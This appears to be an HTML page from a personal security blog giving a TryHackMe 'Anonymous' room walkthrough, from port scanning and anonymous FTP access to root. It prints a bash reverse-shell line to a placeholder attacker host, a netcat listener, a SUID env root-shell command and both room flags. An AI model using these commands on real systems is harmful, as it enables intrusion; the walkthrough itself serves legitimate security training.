@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Anonymous TryHackMe Walkthrough | 0xb0ug44</title>
+  <link rel="stylesheet" href="../css/style.css" />
+  <link rel="stylesheet" href="../css/terminal.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <div class="scanlines" aria-hidden="true"></div>
+
+  <nav class="nav" id="nav">
+    <div class="nav-logo">
+      <a href="../index.html" style="text-decoration:none;color:inherit">
+        <span class="nav-logo-bracket">[</span>
+        <span class="nav-logo-text">0xb0ug44</span>
+        <span class="nav-logo-bracket">]</span>
+        <span class="nav-cursor">_</span>
+      </a>
+    </div>
+    <ul class="nav-links">
+      <li><a href="../index.html" class="nav-link">← Back</a></li>
+      <li><a href="index.html" class="nav-link" style="color:var(--green)">All Write-ups</a></li>
+    </ul>
+  </nav>
+
+  <div class="article-header">
+    <div class="container">
+      <div class="blog-meta" style="margin-bottom:1rem">
+        <span class="blog-category cat-web">Lab Walkthrough</span>
+        <span class="blog-date">September 3, 2025</span>
+      </div>
+      <h1 style="font-family:var(--font-display);font-size:clamp(1.5rem,3.5vw,2.2rem);font-weight:700;letter-spacing:2px;margin-bottom:1rem;line-height:1.3;max-width:800px;">
+        Anonymous TryHackMe Walkthrough: From FTP Access to Root
+      </h1>
+      <div style="display:flex;gap:1rem;align-items:center;flex-wrap:wrap">
+        <div style="display:flex;align-items:center;gap:0.5rem">
+          <div style="width:32px;height:32px;border-radius:50%;background:var(--green-glow);border:1px solid var(--green);display:flex;align-items:center;justify-content:center;font-size:0.8rem;color:var(--green)">MY</div>
+          <span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">Mohamed Yassine Bougamra</span>
+        </div>
+        <div class="blog-tags-row">
+          <span class="btag">TryHackMe</span>
+          <span class="btag">Anonymous</span>
+          <span class="btag">FTP</span>
+          <span class="btag">Privilege Escalation</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <main class="article-content" style="z-index:2;position:relative;">
+    <div style="background:rgba(255,204,0,0.06);border:1px solid rgba(255,204,0,0.2);border-radius:4px;padding:1rem 1.25rem;margin-bottom:2rem;font-family:var(--font-mono);font-size:0.82rem;color:#ffcc00;">
+      ⚠️ Spoiler warning: this post contains the complete solution for the Anonymous room. Try the room yourself first if you want to solve it without hints.
+    </div>
+
+    <p>Anonymous is a compact TryHackMe room built around a straightforward but useful attack chain. It starts with network and SMB enumeration, moves through anonymous FTP access and a reverse shell, and finishes with a SUID-based privilege escalation.</p>
+
+    <p>This is the route I followed from the initial scan to both flags.</p>
+
+    <h2>Step 1: Network Enumeration with Nmap</h2>
+    <p>I began with a full TCP scan to identify the services exposed by the target.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>recon.sh</span><span>nmap</span></div>
+      <pre><code>nmap -p- &lt;target-ip&gt;</code></pre>
+    </div>
+
+    <figure class="article-figure">
+      <img src="images/anonymous-01.webp" alt="Nmap scan showing the open services on the Anonymous room target" loading="lazy" />
+    </figure>
+
+    <p>The scan showed four open ports, including FTP on port 21 and SMB on ports 139 and 445. Those services gave me two promising directions for the next stage.</p>
+
+    <h2>Step 2: SMB Enumeration</h2>
+    <p>I checked the available SMB shares to see whether the target exposed files that could help with the foothold.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>smb-enum.sh</span><span>smbclient</span></div>
+      <pre><code>smbclient -L &lt;target-ip&gt;</code></pre>
+    </div>
+
+    <figure class="article-figure">
+      <img src="images/anonymous-02.webp" alt="SMB share enumeration results" loading="lazy" />
+    </figure>
+
+    <p>The interesting share was called <code>pics</code>. I kept that information for later and moved to the FTP service, which allowed anonymous login.</p>
+
+    <h2>Step 3: Gaining Initial Access Through FTP</h2>
+    <p>I connected to FTP and tested the default anonymous account.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>ftp-login.txt</span><span>ftp</span></div>
+      <pre><code>ftp &lt;target-ip&gt;
+Username: Anonymous</code></pre>
+    </div>
+
+    <figure class="article-figure">
+      <img src="images/anonymous-03.webp" alt="Anonymous FTP login to the target" loading="lazy" />
+    </figure>
+
+    <p>After logging in, I navigated to the scripts directory and uploaded a reverse-shell script.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>upload.sh</span><span>ftp</span></div>
+      <pre><code>put clean.sh</code></pre>
+    </div>
+
+    <figure class="article-figure">
+      <img src="images/anonymous-04.webp" alt="Uploading clean.sh through the anonymous FTP session" loading="lazy" />
+    </figure>
+
+    <p>I edited <code>clean.sh</code> so it would connect back to my machine:</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>clean.sh</span><span>reverse-shell</span></div>
+      <pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1</code></pre>
+    </div>
+
+
+    <p>Before triggering the script, I started a Netcat listener on the same port:</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>listener.sh</span><span>netcat</span></div>
+      <pre><code>nc -nlvp 4444</code></pre>
+    </div>
+
+    <figure class="article-figure">
+      <img src="images/anonymous-06.webp" alt="Netcat listener waiting for the reverse shell" loading="lazy" />
+    </figure>
+
+    <p>Once the scheduled script executed, the listener received a shell on the target.</p>
+
+    <h2>Step 4: Capturing the User Flag</h2>
+    <p>With access to the machine, I checked the available files and entered the <code>pics</code> directory identified during SMB enumeration.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>user-flag.sh</span><span>shell</span></div>
+      <pre><code>ls
+cd pics
+cat user.txt</code></pre>
+    </div>
+
+    <figure class="article-figure">
+      <img src="images/anonymous-07.webp" alt="Reading the user flag from the pics directory" loading="lazy" />
+    </figure>
+
+    <p>The user flag was:</p>
+    <div class="codeblock">
+      <div class="bar"><span>user.txt</span><span>flag</span></div>
+      <pre><code>90d6f992585815ff991e68748c414740</code></pre>
+    </div>
+
+    <h2>Step 5: Privilege Escalation</h2>
+    <p>Next, I searched for SUID binaries owned by root. These binaries can be dangerous when they expose a way to execute commands with elevated privileges.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>suid-enum.sh</span><span>privilege-escalation</span></div>
+      <pre><code>find / -user root -perm -u=s 2&gt;/dev/null</code></pre>
+    </div>
+
+    <p>The binary that stood out was <code>/usr/bin/env</code>. GTFOBins documents a way to use it to start a privileged shell.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>env-root.sh</span><span>gtfobins</span></div>
+      <pre><code>env /bin/sh -p
+whoami</code></pre>
+    </div>
+
+    <figure class="article-figure">
+      <img src="images/anonymous-08.webp" alt="Using the SUID env binary to obtain a root shell" loading="lazy" />
+    </figure>
+
+    <p>The output confirmed that the shell was running as <code>root</code>.</p>
+
+    <h2>Step 6: Capturing the Root Flag</h2>
+    <p>With root access, I navigated to the root directory and read the final flag.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>root-flag.sh</span><span>shell</span></div>
+      <pre><code>cd /root
+cat root.txt</code></pre>
+    </div>
+
+
+
+    <div class="codeblock">
+      <div class="bar"><span>root.txt</span><span>flag</span></div>
+      <pre><code>4d930091c31a622a7ed10f27999af363</code></pre>
+    </div>
+
+    <h2>Takeaways</h2>
+    <p>Anonymous is a good beginner-friendly exercise because every step reinforces a practical habit: scan broadly, inspect exposed services, test default access carefully, and always check for simple privilege-escalation paths such as SUID binaries.</p>
+
+
+    <p>If you want to practice the same chain, try <a href="https://tryhackme.com/room/anonymous" target="_blank" rel="noopener noreferrer">Anonymous on TryHackMe</a> before reading the walkthrough.</p>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-bottom" style="border-top:none;padding-top:0">
+        <p>© 2026 Mohamed Yassine Bougamra · <a href="../index.html" style="color:var(--green)">← Back to Portfolio</a></p>
+        <p class="footer-ascii">/* stay paranoid, stay safe */</p>
+      </div>
+    </div>
+  </footer>
+
+  <style>
+    .article-figure {
+      margin: 0 0 1.5rem 0;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.8rem;
+    }
+    .article-figure img {
+      display: block;
+      width: 100%;
+      max-width: 1100px;
+      height: auto;
+      border-radius: 3px;
+      margin: 0 auto;
+    }
+  </style>
+</body>
+</html>
